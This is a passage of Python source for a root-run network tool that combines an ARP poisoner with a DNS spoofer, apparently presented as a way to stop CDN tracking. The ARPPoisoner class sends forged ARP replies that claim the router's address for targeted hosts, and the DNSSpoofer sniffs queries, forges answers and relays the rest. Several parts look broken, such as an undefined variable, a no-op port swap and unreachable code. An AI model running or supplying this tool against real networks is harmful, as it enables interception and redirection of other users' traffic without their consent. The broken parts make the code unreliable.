      # We just return None, telling that there are too many IPs.
      # It is critical in IPv6 adresses, where there can be large
      # ranges of IPs (like billions of IPs).
      ip_number = functools.reduce(int.__mul__, map(len, parts), 1)
      if len(targets) + ip_number > 255:
        return None
      targets.update(map(".".join, combinaisons(parts)))
    return targets

  def is_valid_target(self, target):
    ip, mac = target
    if self.targets_ips is not None:
      return ip in self.targets_ips
    # self.targets_ips can be none if the total number of targeted
    # IPs is too high.
    # In this case, we use a more "intelligent" verification
    for target in self.targets_regex:
      parts = zip(ip.split("."), target.split("."))
      for ip_part, target_part in parts:
        if "-" in target_part:
          begin, end = map(int, target_part.split("-"))
          if begin > end:
            begin, end = end, begin
          if not begin <= int(ip_part) <= end:
            return False
        elif ip_part != target_part:
          return False
    return True


class TmpCtx(dict):

  """
  Dict which keys are also attributes:
    ctx["something"] == ctx.something

  Temp context to store the most used packet's info:
    router raw/displayable mac/ip
    source raw/displayable mac/ip
    target raw/displayable mac/ip
  Can be used to store anything in fact.
  """

  def __init__(self, *args, **kwargs):
    super().__init__(*args, **kwargs)

  def __getattr__(self, attr):
    if attr in self:
      return self[attr]
    raise AttributeError()

  def __setattr__(self, attr, value):
    self[attr] = value


class ARPPoisoner(Thread):

  """
  The ARP Sniffer/Poisoner.
  """

  def __init__(self, context):
    super().__init__()
    self.context = context
    self.running = False
    self.last_ask_targets_mac = 0
    self.last_send_i_is_the_rooter = 0

  def run(self):
    self.create_device_socket()
    self._run_at_pace()

  def create_device_socket(self):
    elevate_privilege()
    self.device_socket = socket.socket(
      socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW
    )
    lower_privilege()
    self.device_socket.bind((self.context.device, socket.SOCK_RAW))

  def stop(self):
    logger.info("ARP Poisonner stopping...", color=ARP_COLOR)
    self.running = False
    if self.is_alive():
      self.join()
    logger.info("ARP Poisonner stopped.", color=ARP_COLOR)

  def _run_at_pace(self):
    self.running = True
    arp_logger.info("ARP poisonner started: 1 ARP per %d seconds." % (
      self.context.options.arp_elapse_time
    ))
    elevate_privilege()
    s = socket.socket(
      socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003)
    )
    lower_privilege()
    self.ctx = TmpCtx()
    s.settimeout(1)
    while self.running:
      if self.context.options.router_mac is None:
        self.update_router_adress()
      self.ask_targets_mac()
      self.send_i_is_the_rooter()
      try:
        ## we process packets until there are no packet anymore.
        packet = s.recvfrom(65565)[0]
        packet = Layer4(packet)
        if packet.contains_arp:
          self.process_arp(packet)
      except socket.timeout:
        pass
      except KeyboardInterrupt:
        self.stop()

  def init_tmp_ctx(self, packet):
    self.ctx.raw_target_ip = packet.arp_ip_target
    self.ctx.raw_target_mac = packet.eth_mac_target
    self.ctx.raw_source_ip = packet.arp_ip_source
    self.ctx.raw_source_mac = packet.eth_mac_source
    self.ctx.target_ip = socket.inet_ntoa(packet.arp_ip_target)
    self.ctx.target_mac = raw_to_mac(self.ctx.raw_target_mac)
    self.ctx.source_ip = socket.inet_ntoa(packet.arp_ip_source)
    self.ctx.source_mac = raw_to_mac(self.ctx.raw_source_mac)
    self.ctx.router_ip = self.context.router_ip
    self.ctx.router_mac = self.context.router_mac
    self.ctx.raw_router_ip = pack(
      "!4B", *map(int, self.ctx.router_ip.split("."))
    )
    self.ctx.raw_router_mac = pack(
      "!6B", *[int(x, 16) for x in self.ctx.router_mac.split(":")]
    )

  def update_router_adress(self):
    ## we ask router's mac address once per hour.
    ## this should not change frequently
    if time.time() - self.context.last_router_mac_update > 3600:
      arp_logger.info("Periocical update of the router's MAC adress.")
      self.send_router_arp_query()

  def ask_targets_mac(self):
    ## we ask the targets' mac address once per hour.
    ## this should not change frequently
    if time.time() - self.last_ask_targets_mac > 3600:
      self.last_ask_targets_mac = time.time()
      arp_logger.info("Periocical update of the targets' MAC adress.")
      self.send_targets_arp_query()

  def send_router_arp_query(self):
    router_mac = self.context.arp_table.get(
      self.context.router_ip, None
    )
    self.send_arp(
      (self.context.ip, self.context.mac),
      (self.context.router_ip, router_mac)
    )

  def send_targets_arp_query(self):
    targets = self.context.targets_ips
    if targets is None:
      targets = [(self.context.broadcast_ip, self.context.broadcast_mac)]
    else:
      targets = [
        (target, self.context.arp_table.get(target, self.context.broadcast_mac))
        for target in targets - {self.context.router_ip, self.context.ip}
      ]
    source = self.context.ip, self.context.mac
    for target in targets:
      self.send_arp(source, target)

  def process_arp(self, packet):
    self.init_tmp_ctx(packet)
    if packet.is_arp_request:
      self.process_arp_request(packet)
    else:
      self.process_arp_response(packet)

  def process_arp_request(self, packet):
    arp_logger.info("%s[%s] asks who is %s[%s] ?" % (
      self.ctx.source_ip, self.ctx.source_mac,
      self.ctx.target_ip, self.ctx.target_mac
    ))

  def process_arp_response(self, packet):
    if self.ctx.source_ip == self.context.router_ip and \
        self.ctx.source_mac == self.context.mac:
      ## This arp is a fake one. Created by us.
      return
    if self.ctx.source_ip == self.context.router_ip \
        or self.context.is_valid_target((self.ctx.source_ip, None)):
      self.context.arp_table[self.ctx.source_ip] = (
        self.ctx.source_mac, time.time()
      )
      stored = " [STORED]"
    else:
      stored = ""
    arp_logger.info("%s is at %s" % (
      self.ctx.source_ip, self.ctx.source_mac
    )+stored)

  def send_i_is_the_rooter(self):
    if time.time() - self.last_send_i_is_the_rooter < self.context.options.arp_elapse_time:
      return
    self.last_send_i_is_the_rooter = time.time()
    targets = self.context.targets_ips
    if targets is None:
      targets = [(self.context.broadcast_ip, self.context.broadcast_mac)]
    else:
      targets = [
        (target, self.context.arp_table.get(target, [None])[0])
        for target in targets - {self.context.router_ip, self.context.ip}
      ]
    for target in targets:
      self.tell_I_is_router_to(*target)

  def tell_I_is_router_to(self, ip, mac=None):
    if mac is not None:
      return self.send_arp(
        (self.context.router_ip, self.context.mac), (ip, mac),
        kind="response"
      )
      return self.send_arp(
        (self.context.router_ip, self.context.router_mac), (ip, mac),
        fake_mac=self.context.mac,
        kind="response"
      )
    else:
      return self.send_arp(
        (self.context.ip, self.context.mac), (ip, self.context.broadcast_mac),
      )

  def send_arp(self, source, target, fake_mac=None, kind="query"):
    ip_source, mac_source = source
    ip_target, mac_target = target
    arp_logger.info(
      "Sending ARP %s to %s[%s] as %s[%s]." % (
        kind,
        ip_target, mac_target,
        ip_source, mac_source,
      )
    )
    arp = Layer4()
    arp.eth_mac_target = mac_to_raw(mac_target)
    arp.eth_mac_source = mac_to_raw(mac_source)
    arp.eth_data_protocol = Layer3.ARP
    arp.arp_network_type = Layer4.ETHERNET
    arp.arp_protocol_type = Layer3.IPV4
    arp.arp_hw_addr_length = pack("!B", 0x0006)
    arp.arp_sw_addr_length = pack("!B", 0x0004)
    if kind == "query":
      arp.arp_operation = Layer4.ARP_REQUEST
    else:
      arp.arp_operation = Layer4.ARP_RESPONSE
    arp.arp_mac_source = mac_to_raw(mac_source)
    arp.arp_ip_source = ip_to_raw(ip_source)
    if fake_mac is None:
      if mac_target == self.context.broadcast_mac:
        arp.arp_mac_target = EMPTY_MAC
      else:
        arp.arp_mac_target = mac_to_raw(mac_target)
    else:
      arp.arp_mac_target = mac_to_raw(fake_mac)
    arp.arp_ip_target = ip_to_raw(ip_target)
    self.device_socket.send(arp.raw_data)


class DNSSpoofer(object):

  """
  The DNS Sniffer/Spoofer.
  """

  def __init__(self, context):
    self.context = context
    self.running = False
    self.forward_answer = {}
    self.table = {}

  def create_device_socket(self):
    elevate_privilege()
    self.device_socket = socket.socket(
      socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW
    )
    lower_privilege()
    self.device_socket.bind((self.context.device, socket.SOCK_RAW))

  def run(self):
    dns_logger.info("DNS spoofer has started.")
    self.create_device_socket()
    self._run()
    dns_logger.info("DNS Spoofer stopped.")

  def _run(self):
    self.running = True
    elevate_privilege()
    s = socket.socket(
      socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003)
    )
    lower_privilege()
    s.settimeout(1)
    self.ctx = TmpCtx({
      "router_ip": self.context.router_ip,
      "raw_router_ip": pack(
        "!4B", *map(int, self.context.router_ip.split("."))
      ),
    })
    while self.running:
      try:
        packet = Layer7(s.recvfrom(65565)[0])
        if packet.is_dns:
          self.process_dns_packet(packet)
      except socket.timeout:
        continue
      except KeyboardInterrupt:
        self.stop()
        break
    self.device_socket.close()

  def init_tmp_ctx(self, packet):
    self.ctx.raw_target_ip = packet.ip_ip_target
    self.ctx.raw_target_mac = packet.eth_mac_target
    self.ctx.raw_source_ip = packet.ip_ip_source
    self.ctx.raw_source_mac = packet.eth_mac_source
    self.ctx.target_ip = socket.inet_ntoa(packet.ip_ip_target)
    self.ctx.target_mac = raw_to_mac(self.ctx.raw_target_mac)
    self.ctx.source_ip = socket.inet_ntoa(packet.ip_ip_source)
    self.ctx.source_mac = raw_to_mac(self.ctx.raw_source_mac)
    self.ctx.router_ip = self.context.router_ip
    self.ctx.router_mac = self.context.router_mac
    self.ctx.raw_router_ip = pack(
      "!4B", *map(int, self.ctx.router_ip.split("."))
    )
    self.ctx.raw_router_mac = pack(
      "!6B", *[int(x, 16) for x in self.ctx.router_mac.split(":")]
    )
    self.ctx.source_is_our_ip = self.ctx.source_ip == self.context.ip
    self.ctx.target_is_our_ip = self.ctx.target_ip == self.context.ip

  def process_dns_packet(self, packet):
    self.init_tmp_ctx(packet)
    if packet.is_dns_query:
      self.process_dns_question(packet)
    else:
      self.process_dns_answer(packet)

  def process_dns_question(self, dns):
    server_name = DNSData(dns).query_name.decode("utf-8")
    dns_logger.info("%s[%s] asked for %s" % (
      self.ctx.source_ip, self.ctx.source_mac, server_name
    ))
    if server_name in self.table:
      #self.inject(self.forge_response(dns, server_name))
      self.forge_response(dns, server_name)
    elif self.ctx.target_ip != self.context.router_ip or \
        self.ctx.target_mac != self.context.router_mac:
      self.forward_to_router(dns)

  def forge_response(self, dns, server_name):
    dns_logger.info("Forge DNS response for %s [not injected!!]" % server_name)
    ## should set IP, MAC, ports, add response and update checksum
    dns.ip_ip_target = self.ctx.source_ip
    dns.ip_ip_source = pack("!4B", self.context.ip)
    dns.eth_mac_target = self.ctx.source_mac
    dns.eth_mac_source = pack("!6B", self.context.mac)
    data = dns.dns_data
    data.add_records = pack(
      "!6H", 0xc00c, 0x0001, 0x0001, 0x0000, 0x0101, 0x0004
    ) +  pack(
      "!4B", *map(int, self.table[server_name].split("."))
    )
    dns.data = data
    if dns.is_udp:
      dns.udp_source_port, dns.udp_source_port = \
        dns.udp_source_port, dns.udp_source_port
      dns.set_udp_checksum()
    elif dns.is_tcp:
      dns.tcp_source_port, dns.tcp_source_port = \
        dns.tcp_source_port, dns.tcp_source_port
      dns.set_tcp_checksum()
    return dns

  def forward_to_router(self, dns):
    if not self.context.router_mac:
      return dns_logger.error(
        "Could not forward DNS query! Packet lost!", color=RED
      )
    if dns.dns_trans_id not in self.forward_answer:
      self.forward_answer[dns.dns_trans_id] = (
        self.ctx.raw_source_ip, self.ctx.raw_source_mac
      )
      dns_logger.info("Forwarding DNS query 0x%s to router." % (
        ''.join(["%02x"%i for i in dns.dns_trans_id])
      ))
      dns.eth_mac_target = self.ctx.raw_router_mac
      dns.ip_ip_target = self.ctx.raw_router_ip
      self.inject(dns)

  def process_dns_answer(self, dns):
    adress = self.forward_answer.get(idf, None)
    if adress is not None:
      del self.forward_answer[idf]
      dns.ip_ip_target, dns.eth_mac_target = adress
      dns.set_udp_checksum()
      self.inject(dns)

  def inject(self, packet):
    dns_logger.debug("Injected.")
    self.device_socket.send(packet.raw_data)

  def stop(self):
    print(DNS_COLOR+"DNS Spoofer stopping..."+NO_COLOR)
    self.running = False


## I stole the checksum calculation method from scapy (utils.py)
if pack("H",1) == "\x00\x01": # big endian
  def _checksum(pkt):
    if len(pkt) % 2 == 1:
      pkt += b"\0"
    s = sum(array.array("H", pkt))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s
    return s & 0xffff
else:
  def _checksum(pkt):
    if len(pkt) % 2 == 1:
      pkt += b"\0"
    s = sum(array.array("H", pkt))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s
    return (((s>>8)&0xff)|s<<8) & 0xffff

def checksum(packet):
  return _checksum(packet) or 0xffff

def raw_to_ip(raw_ip):
  return ".".join(map(str, raw_ip))

def raw_to_mac(raw_mac):
  return ":".join(["%02x"%(i&255)for i in raw_mac])

def ip_to_raw(ip):
  return pack("!4B", *map(int, ip.split('.')))

def mac_to_raw(mac):
  return pack("!6B", *[int(x, 16)for x in mac.split(':')])

def elevate_privilege():
  os.seteuid(0)

def lower_privilege():
  os.seteuid(65534)

def attach_critical_callback(function):
  def wrapper(*args, **kwargs):
    function(*args, **kwargs)
    critical_callback()
  return wrapper

def critical_callback():
  logger.warn("A critical error occured. Shutting down.")
  # just a hack to emulated `if defined(context)`
  try:
    context
  except NameError:
    logger.info("Nothing launched. No cleanup needed.")
  else:
    if context.dns_spoofer:
      logger.info("DNS Spoofer cleanup.")
      if context.dns_spoofer.running:
        context.dns_spoofer.stop()
      else:
        logger.info("Nothing to do.")
    else:
      logger.info("DNS Spoofer still not created.")
    if context.arp_poisoner:
      logger.info("ARP Poisoner cleanup")
      if context.arp_poisoner.is_alive():
        context.arp_poisoner.stop()
      else:
        logger.info("Nothing to do.")
    else:
      logger.info("ARP Poisoner still not created.")
  exit()

def color_logger(logger, overall_color=None, methods=None):
  if overall_color is None:
    colors = GREY, GREEN, ORANGE, RED, IRED
  else:
    colors = (overall_color, ) * 5
  if methods is None:
    methods = "debug", "info", "warn", "error", "critical"
  for level, color in zip(methods, colors):
    setattr(logger, level, add_logger_color(getattr(logger, level), color))

def add_logger_color(logger_method, _color):
  def wrapper(message, *args, **kwargs):
    color = kwargs.pop("color", _color)
    if isinstance(color, int):
      color = "\33[%dm" % color
    return logger_method(
      color+message+NO_COLOR,
      *args, **kwargs
    )
  return wrapper

def create_option_parser():
  parser = optparse.OptionParser(
    usage="python3 ./%prog interface [OPTIONS]\n" \
    "\tPrevent CDN to track your online activity.\n" \
    "\tRedirect users' queries according to the host file rules.\n" \
    "\tUses ARP poisoning and DNS spoofing."
  )
  set_global_parser_options(parser)
  arp_group = optparse.OptionGroup(parser, "ARP Options")
  set_arp_parser_options(arp_group)
  parser.add_option_group(arp_group)
  dns_group = optparse.OptionGroup(parser, "DNS Options")
  set_dns_parser_options(dns_group)
  parser.add_option_group(dns_group)
  return parser

def set_global_parser_options(parser):
  prog = os.path.basename(sys.argv[0])
  parser.add_option(
    "-p", "--pid_file",
    dest="pidfile",
    default="/tmp/%s.pid" % prog,
    help="The file path where to store our PID (Default=/tmp/%s.pid)."%prog,
    metavar="FILE"
  )
  parser.add_option(
    "-r", "--router_ip",
    dest="router_ip",
    default=None,
    help="The IP of the router. " \
      "Guessed using `route` if not provided.",
    metavar="IP"
  )
  parser.add_option(
    "-m", "--router_mac",
    dest="router_mac",
    default=None,
    help="The MAC of the router. " \
      "Guessed using the `arp` command if not provided. " \
      "Found using ARP queries if not found.",
    metavar="MAC"
  )
  parser.add_option(
    "-H", "--hosts_file",
    dest="hosts",
    default="./hosts",
    help="The host file that tells the routing rules.",
    metavar="FILE"
  )
  parser.add_option(
    "-t", "--targets_file",
    dest="targets",
    default="./targets",
    help="The file containing the targeted IPs.",
    metavar="FILE"
  )

def set_arp_parser_options(arp_group):
  arp_group.add_option(
    "-e", "--elapse_time", 
    dest="arp_elapse_time",
    default=1,
    type="int",
    help="Time ellapsed between two ARP responses. Ignored if -r is set.",
    metavar="MILISECONDS"
  )

def set_dns_parser_options(dns_group):
  dns_group.add_option(
    "-d", "--dns_ip",
    dest="dns_ip",
    default=None,
    help="The IP adress of the DNS. " \
    "Our own IP is used if not provided.",
    metavar="IP"
  )

def parse_arguments():
  parser = create_option_parser()
  options, arguments = parser.parse_args()
  if len(arguments) != 1:
    # manualy trigger the help. 
    parser.parse_args(["-h"])
  return Context(*arguments, options)

def match_ipv4 (ip):
  """ Test if the given ip is IPV4 """
  return re.match (
    "^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)." \
    "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)." \
    "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)." \
    "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",
    ip
  ) is not None

def match_ipv6 (ip):
  """ Test if the given ip is IPV6 """
  return re.match (
    "^((([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4})|" \
    "(([0-9A-Fa-f]{1,4}:){6}:[0-9A-Fa-f]{1,4})|" \
    "(([0-9A-Fa-f]{1,4}:){5}:([0-9A-Fa-f]{1,4}:)?[0-9A-Fa-f]{1,4})|" \
    "(([0-9A-Fa-f]{1,4}:){4}:([0-9A-Fa-f]{1,4}:){0,2}[0-9A-Fa-f]{1,4})|" \
    "(([0-9A-Fa-f]{1,4}:){3}:([0-9A-Fa-f]{1,4}:){0,3}[0-9A-Fa-f]{1,4})|" \
    "(([0-9A-Fa-f]{1,4}:){2}:([0-9A-Fa-f]{1,4}:){0,4}[0-9A-Fa-f]{1,4})|" \
    "(([0-9A-Fa-f]{1,4}:){6}((b((25[0-5])|(1d{2})|(2[0-4]d)|" \
    "(d{1,2}))b).){3}(b((25[0-5])|(1d{2})|(2[0-4]d)|(d{1,2}))b))|" \
    "(([0-9A-Fa-f]{1,4}:){0,5}:((b((25[0-5])|(1d{2})|(2[0-4]d)|" \
    "(d{1,2}))b).){3}(b((25[0-5])|(1d{2})|(2[0-4]d)|(d{1,2}))b))|" \
    "(::([0-9A-Fa-f]{1,4}:){0,5}((b((25[0-5])|(1d{2})|(2[0-4]d)|" \
    "(d{1,2}))b).){3}(b((25[0-5])|(1d{2})|(2[0-4]d)|(d{1,2}))b))|" \
    "([0-9A-Fa-f]{1,4}::([0-9A-Fa-f]{1,4}:){0,5}[0-9A-Fa-f]{1,4})|" \
    "(::([0-9A-Fa-f]{1,4}:){0,6}[0-9A-Fa-f]{1,4})|" \
    "(([0-9A-Fa-f]{1,4}:){1,7}:))$",
    ip
  ) is not None

def match_mac (mac):
  """ Test if the given ip is a MAC """
  return re.match (
    "^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$",
    mac
  ) is not None

def combinaisons(x):
  if len(x) == 1:
    return x[0]
  return [
    (i, )+j if isinstance(j, tuple) else (i, j)
    for i in x[0] for j in combinaisons(x[1:])
  ]

def create_pid_file(context, no=0):
  path = context.options.pidfile
  if no:
    path += "_%d" % no
    logger.info("New PID file name choosen: '%s'." % path)
  try:
    fd = os.open(path, os.O_CREAT|os.O_EXCL|os.O_WRONLY)
  except FileExistsError:
    logger.info("PID file '%s' already exists." % path)
    return create_pid_file(context, no+1)
  with os.fdopen(fd, 'w') as pid_file:
    pid_file.write(str(os.getpid()))
  logger.info("PID file '%s' created." % path)
  context.options.pidfile = path

def remove_pid_file(path):
  os.unlink(path)
  logger.info("PID file '%s' removed." % path)


if __name__ == "__main__":

  if os.getuid() != 0:
    print("You need to be root to run this program.")
    create_option_parser().parse_args(["-h"])
    exit()
  # we lower privelege everywhere.
  # we will upper privilege only when needed.
  lower_privilege()

  logging.basicConfig(format="[%(levelname)-10s] %(message)s", level=logging.DEBUG)
  logger = logging.getLogger(os.path.basename(__file__))
  color_logger(logger)
  logger.critical = attach_critical_callback(logger.critical)
  dns_logger = logging.getLogger("DNS")
  arp_logger = logging.getLogger("ARP")
  dns_logger.propagate = False
  arp_logger.propagate = False
  dns_sh = logging.StreamHandler()
  dns_sh.setFormatter(logging.Formatter(
    DNS_COLOR+"[DNS-%(levelname)-6s] %(message)s"+NO_COLOR
  ))
  dns_logger.addHandler(dns_sh)
  arp_sh = logging.StreamHandler()
  arp_sh.setFormatter(logging.Formatter(
    ARP_COLOR+"[ARP-%(levelname)-6s] %(message)s"+NO_COLOR
  ))
  arp_logger.addHandler(arp_sh)
  color_logger(dns_logger, overall_color=DNS_COLOR)
  color_logger(arp_logger, overall_color=ARP_COLOR)

  logger.info("PID=%d." %os.getpid())

  context = parse_arguments()

  create_pid_file(context)
  atexit.register(remove_pid_file, context.options.pidfile)

  context.arp_poisoner = ARPPoisoner(context)
  context.dns_spoofer = DNSSpoofer(context)
  context.arp_poisoner.start()
  context.dns_spoofer.run()
  context.arp_poisoner.stop()

  exit()